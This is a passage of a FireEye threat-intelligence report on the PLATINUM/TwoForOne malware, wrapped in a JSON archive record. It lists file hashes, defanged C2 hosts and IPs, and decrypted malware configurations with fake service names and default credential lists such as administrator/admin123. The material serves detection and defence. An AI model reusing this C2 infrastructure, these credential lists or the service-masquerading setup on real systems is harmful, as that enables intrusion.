p2ptun.exe|Col2|\n|---|---|\n|MD5|b0121ef3440e37599d73a4895cb3499f|\n|SHA-­‐1|93eee408ede32869c1aa5db77bc16736cecda588|\n|SHA-­‐256|f5e75df088cc2ffe7e635c83549998d41d84762614ccc2fa5e03148aee38e256|\n|Compile|2010-­‐09-­‐28T02:14:01Z|\n|On VT|2013-­‐07-­‐25 23:19:43|\n|Stage 2 DLL||\n|MD5|4365918ea8f1d4764bc1695be5e1de55|\n|SHA-­‐1|53854605cfb9788f47b99b4e26231f2b19246ff6|\n|SHA-­‐256|814c8e7b200451352d07dc62a5e1003b41b6264c279d7a68cf63c62d7b0630e6|\n|Compile|2010-­‐09-­‐28T02:14:01Z|\n\n\n-----\n\nOffice search service fake, msofs.exe\nMD5 eaec3e5334b937a526a418b88d63291c\nSHA-­‐1 09e0dfbb5543c708c0dd6a89fd22bbb96dc4ca1c\nSHA-­‐256 23ea986ddaa82e5947f02bd8aa1d5d326384a9137b6f93c76b64ee9e5001ffc7\nCompile 2012-­‐11-­‐02T17:13:20Z\nOn VT 2014-­‐08-­‐30 09:21:03\nStage 2 DLL\nMD5 2de72275ae8aedea3e7d0e1b0103dd46\nSHA-­‐1 7dc73cf15685505f406c029cd3d3fb74b2a77a2b\nSHA-­‐256 4143f83c18cbf8f13366bf2d654e8d9019af19b4cf2f2b950a973ee8b1c97989\nCompile 2012-­‐11-­‐02T17:13:20Z\n\nAdobe Reader runtime service fake, apm.dll\nMD5 66874856da4210163bc3821ecd484d20\nSHA-­‐1 105062e65cecabe1f83a623b0541415eac2a1e48\nSHA-­‐256 1a36451b11472c6703fe22d4be0989e657176fbf295ad0f5c0ac1c7c642efe11\nCompile 2015-­‐07-­‐03T08:53:24Z\nOn VT N/A\nStage 2 DLL\nMD5 5f34be2e01b76e2902cc801a6156fdaf\nSHA-­‐1 ae96b46fe90312d78e728fd222156cbf41fa4dda\nSHA-­‐256 8ea20a9c7d0422503bec6c256c833d0ab4ca4e0ab9b89ac2d4c0739f848efae2\nCompile 2014-­‐10-­‐25T22:49:45Z\n\n### Concrete observable activity exists since 2012 when one of the related payloads (mstun32.exe) was uploaded to Virus Total (VT); however, the compile date of mstun32.exe goes back to 2009- 12-17, and passive DNS records for C2 (hXXp://updates.analyticspro.co[.]cc/img/0.gif) span from 2010-10-11 to 2011-10-08. Compile dates can easily be forged, but these two data points suggest that the attack using mstun32.exe occurred well before the payload landed on VT in 2012.\n\n# Additional IOCs\n\n### The appendix includes decrypted configuration files for 3 of the 4 payloads. They are great references for IOCs, containing C2 infrastructure, file names, file paths, and registry keys.\n For the corrupted payload mstun32.exe, a few possible IOCs are apparent:\nPath APPDATA\\\\Microsoft\\\\Netmeeting\\\\1328-­‐0013\\\\mstun32.dll\nC2 hXXp://updates.analyticspro.co[.]cc/img/0.gif\nC2 61.31.203[.]98\n\n# Acknowledgements\n\n### FireEye would like to thank Elia Florio of Microsoft working with us on this issue.\n\n1440 McCarthy Boulevard **tel 408 321 6300 | fax 408 321 9818**\n\n|Office search service fake, msofs.exe|Col2|\n|---|---|\n|MD5|eaec3e5334b937a526a418b88d63291c|\n|SHA-­‐1|09e0dfbb5543c708c0dd6a89fd22bbb96dc4ca1c|\n|SHA-­‐256|23ea986ddaa82e5947f02bd8aa1d5d326384a9137b6f93c76b64ee9e5001ffc7|\n|Compile|2012-­‐11-­‐02T17:13:20Z|\n|On VT|2014-­‐08-­‐30 09:21:03|\n|Stage 2 DLL||\n|MD5|2de72275ae8aedea3e7d0e1b0103dd46|\n|SHA-­‐1|7dc73cf15685505f406c029cd3d3fb74b2a77a2b|\n|SHA-­‐256|4143f83c18cbf8f13366bf2d654e8d9019af19b4cf2f2b950a973ee8b1c97989|\n|Compile|2012-­‐11-­‐02T17:13:20Z|\n\n|Adobe Reader runtime service fake, apm.dll|Col2|\n|---|---|\n|MD5|66874856da4210163bc3821ecd484d20|\n|SHA-­‐1|105062e65cecabe1f83a623b0541415eac2a1e48|\n|SHA-­‐256|1a36451b11472c6703fe22d4be0989e657176fbf295ad0f5c0ac1c7c642efe11|\n|Compile|2015-­‐07-­‐03T08:53:24Z|\n|On VT|N/A|\n|Stage 2 DLL||\n|MD5|5f34be2e01b76e2902cc801a6156fdaf|\n|SHA-­‐1|ae96b46fe90312d78e728fd222156cbf41fa4dda|\n|SHA-­‐256|8ea20a9c7d0422503bec6c256c833d0ab4ca4e0ab9b89ac2d4c0739f848efae2|\n|Compile|2014-­‐10-­‐25T22:49:45Z|\n\n|Path|APPDATA\\\\Microsoft\\\\Netmeeting\\\\1328-­‐0013\\\\mstun32.dll|\n|---|---|\n|C2|hXXp://updates.analyticspro.co[.]cc/img/0.gif|\n|C2|61.31.203[.]98|\n\n\n-----\n\n# Appendix\n\n### Note that configuration files are generated at runtime. Consequently, some values are specific to the environment (e.g., StartTime, Windows users in file paths, and so on). Configuration - 66874856da4210163bc3821ecd484d20\n## StartTime=1440813579 \r  RunTimeFolderUser=C:\\Documents \r and \r Settings\\daniel\\Adobe\\Reader\\9.0\\ \r  RunTimeFolderAdmin=C:\\Program \r Files\\Adobe\\Reader\\9.0\\Dis\\ \r  RunTimeFileNameDll=apm.dll \r  ServiceKeyName=ATIExfba32 \r  ServiceKeyNameDll=ATIExfba32 \r  ServiceDisplayName=Runtime \r Agent \r for \r Adobe \r Reader \r 9 \r  ServiceDescription=Runtime \r Agent \r for \r Adobe \r Reader \r 9 \r  cmdpathUser=C:\\Documents \r and \r Settings\\daniel\\Adobe\\Reader\\9.0\\ \r  cmdpathAdmin=C:\\Program \r Files\\Adobe\\Reader\\9.0\\Dis\\ \r  cmdname=avm.exe \r  UUID=22c73b88-­‐9440-­‐4e5d-­‐a983-­‐ac00aba8df1c \r  WMIUUID=F \r  installStatus=0 \r  pusername1= \r  pusername2= \r  pusername3= \r  ppassword1= \r  ppassword2= \r  ppassword3= \r  pollcommandsite1=http://nic.net46[.]net/login.php?user=seema \r  pollcommandsite2= \r  pollcommandsite3= \r  pollcommandTime=60 \r  jobNumber=0 \r  slpSite1=190.96.47[.]9 \r  slpSite2=103.13.228[.]132 \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  slpSite3=180.149.240[.]159 \r  slpPort1=80 \r  slpPort2=80 \r  slpPort3=80 \r  pollSlpTime=60 \r  officeStart=08:00 \r  officeEnd=18:00 \r  sat=1 \r  sun=1 \r  expiry=90 \r \n\n1440 McCarthy Boulevard **tel 408 321 6300 | fax 408 321 9818**\n\n\n-----\n\n## delay=0 \r  proxy= \r  proxyType=HTTP \r  checkurl1=http://www.google.com/ \r  checkurl2=http://www.yahoo.com/ \r  checkurl3=http://www.hotmail.com/ \r  lastppassword= \r  lastpusername= \r  lastProxyType= \r  lastProxy= \r  internetTimeout=120000 \r  idleTimeout=2 \r  initialName=adiecl.dll \r  firsttime=DONE \r \n\n### Configuration - b0121ef3440e37599d73a4895cb3499f\n## StartTime=1441091593 \r  RunTimeFolderUser=C:\\Documents \r and \r Settings\\Administrator\\Application \r  Data\\Identities\\{6F15VE41-­‐183A-­‐F150-­‐1B13-­‐33H85E912551}\\ \r  RunTimeFolderAdmin=C:\\Documents \r and \r Settings\\Administrator\\Application \r  Data\\Microsoft\\Netmeeting\\2378-­‐1013-­‐4567\\ \r  RunTimeFileName=p2ptun.exe \r  ServiceKeyName=p2ptunsvc \r  ServiceKeyNameDll=p2ptunsvc \r  ServiceDisplayName=Windows \r P2P \r Tunneling \r Service \r  ServiceDescription=Enables \r an \r authorized \r user \r to \r tunnel \r through \r common \r P2P \r Services. \r  If \r this \r service \r is \r disabled, \r any \r services \r that \r explicitly \r depend \r on \r it \r will \r fail \r to \r start. \r  cmdpathUser=C:\\Documents \r and \r Settings\\Administrator\\Application \r  Data\\Identities\\{6F15VE41-­‐183A-­‐F150-­‐1B13-­‐33H85E912551}\\plugins\\ \r  cmdpathAdmin=C:\\Documents \r and \r Settings\\Administrator\\Application \r  Data\\Microsoft\\Netmeeting\\2378-­‐1013-­‐4567\\plugins\\ \r  cmdname=msntun.exe \r  UUID=2d22e764-­‐ac75-­‐44a4-­‐8564-­‐39426eb42dd3 \r  WMIUUID= \r  installStatus=0 \r  pusername1=administrator \r  pusername2=admin \r  pusername3=root \r  ppassword1=admin123 \r  ppassword2=admin123 \r  ppassword3=password \r \n\n1440 McCarthy Boulevard **tel 408 321 6300 | fax 408 321 9818**\n\n\n-----\n\n## pollcommandsite1= \r  pollcommandsite2= \r  pollcommandsite3= \r  pollcommandTime=1 \r  rwjV}ujmieDSr=0 \r  slpSite1=192.192.114[.]1 \r  slpSite2=127.0.0.1 \r  slpSite3=127.0.0.1 \r  slpPort1=80 \r  slpPort2=80 \r  slpPort3=80 \r  pollSlpTime=5 \r  officeStart=06:00 \r  officeEnd=20:00 \r  sat=1 \r  sun=1 \r  expiry=-­‐1 \r  delay=0 \r  proxy= \r  proxyType= \r  checkurl1=http://www.google.com/ \r  checkurl2=http://www.adobe.com/ \r  checkurl3=http://www.baidu.com/ \r  lastppassword=admin123 \r  lastpusername=administrator \r  lastProxyType= \r  lastProxy= \r  internetTimeout=120000 \r  idleTimeout=5 \r  falseName=winver32.exe \r  firsttime=DONE \r \n [XVEI] \r  gi=1 \r \n### Configuration - eaec3e5334b937a526a418b88d63291c\n## StartTime=1441090892 \r  RunTimeFolderUser=C:\\Documents \r and \r Settings\\Administrator\\Searches\\OfficeCache\\ \r  RunTimeFolderAdmin=C:\\Program \r Files\\Common \r Files\\SpeechEngines\\Microsoft\\ \r  RunTimeFileName=msofs.exe \r  ServiceKeyName=msofsnd \r  ServiceKeyNameDll=msofsn \r  ServiceDisplayName=User \r Search \r \n\n1440 McCarthy Boulevard **tel 408 321 6300 | fax 408 321 9818**\n\n\n-----\n\n## ServiceDescription=Search \r function \r in \r Office. \r If \r this \r service \r is \r disabled, \r the \r search \r  function \r will \r fail. \r  cmdpathUser=C:\\Documents \r and \r Settings\\Administrator\\Searches\\OfficeCache\\ \r  cmdpathAdmin=C:\\Program \r Files\\Common \r Files\\SpeechEngines\\Microsoft\\ \r  cmdname=msofse.exe \r  UUID=0ecef8a0-­‐6558-­‐4fdc-­‐a274-­‐5d72fc90787f \r  WMIUUID=F \r  installStatus=0 \r  pusername1= \r  pusername2= \r  pusername3= \r  ppassword1= \r  ppassword2= \r  ppassword3= \r  pollcommandsite1=http://acc.procstat[.]com/read/resource.php?id=ppZVKda \r  pollcommandsite2= \r  pollcommandsite3= \r  pollcommandTime=45 \r  jobNumber=0 \r  slpSite1=209.45.65[.]163 \r  slpSite2=geocities.efnet[.]at \r  slpSite3=box62.a-­‐inet[.]net \r  slpPort1=80 \r  slpPort2=80 \r  slpPort3=80 \r  pollSlpTime=45 \r  officeStart=07:00 \r  officeEnd=18:59 \r  sat=0 \r  sun=0 \r  expiry=365 \r  delay=0 \r  proxy= \r  proxyType= \r  checkurl1=http://www.detik.com/ \r  checkurl2=http://www.yahoo.com/ \r  checkurl3=http://www.facebook.com/ \r  lastppassword= \r  lastpusername= \r  lastProxyType= \r  lastProxy= \r \n\n1440 McCarthy Boulevard **tel 408 321 6300 | fax 408 321 9818**\n\n\n-----\n\n## internetTimeout=120000 \r  idleTimeout=5 \r  initialName=msofsc.dll \r  firsttime=DONE \r \n [IEVA] \r  gi=1 \r \n\n1440 McCarthy Boulevard **tel 408 321 6300 | fax 408 321 9818**\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "6fc23d14-23a6-4870-8fad-b291b182596f",
            "created_at": "2022-10-25T16:07:18.480113Z",
            "updated_at": "2022-10-25T16:07:18.480113Z",
            "deleted_at": null,
            "name": "ETDA",
            "url": "https://apt.etda.or.th",
            "description": "Threat Group Cards: A Threat Actor Encyclopedia",
            "reports": null
        },
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        }
    ],
    "references": [
        "https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/twoforonefinal.pdf"
    ],
    "report_names": [
        "twoforonefinal.pdf"
    ],
    "threat_actors": [
        {
            "id": "7d8ef10e-1d7b-49a0-ab6e-f1dae465a1a4",
            "created_at": "2023-01-06T13:46:38.595679Z",
            "updated_at": "2025-03-27T02:00:02.869216Z",
            "deleted_at": null,
            "main_name": "PLATINUM",
            "aliases": [
                "TwoForOne",
                "G0068",
                "ATK33"
            ],
            "source_name": "MISPGALAXY:PLATINUM",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e61c46f7-88a1-421a-9fed-0cfe2eeb820a",
            "created_at": "2022-10-25T16:07:24.061767Z",
            "updated_at": "2025-03-27T02:02:10.094583Z",
            "deleted_at": null,
            "main_name": "Platinum",
            "aliases": [
                "ATK 33",
                "Operation EasternRoppels",
                "TwoForOne"
            ],
            "source_name": "ETDA:Platinum",
            "tools": [
                "AMTsol",
                "Adupib",
                "Adupihan",
                "Dipsind",
                "DvDupdate.dll",
                "JPIN",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "RedPepper",
                "RedSalt",
                "Titanium",
                "adbupd",
                "psinstrc.ps1"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716493,
    "ts_updated_at": 1743041148,
    "ts_creation_date": 1441744152,
    "ts_modification_date": 1441744152,
    "files": {
        "pdf": "https://archive.orkl.eu/25aa281300e73d4eee57527c39764f8c22082ea7.pdf",
        "text": "https://archive.orkl.eu/25aa281300e73d4eee57527c39764f8c22082ea7.txt",
        "img": "https://archive.orkl.eu/25aa281300e73d4eee57527c39764f8c22082ea7.jpg"
    }
}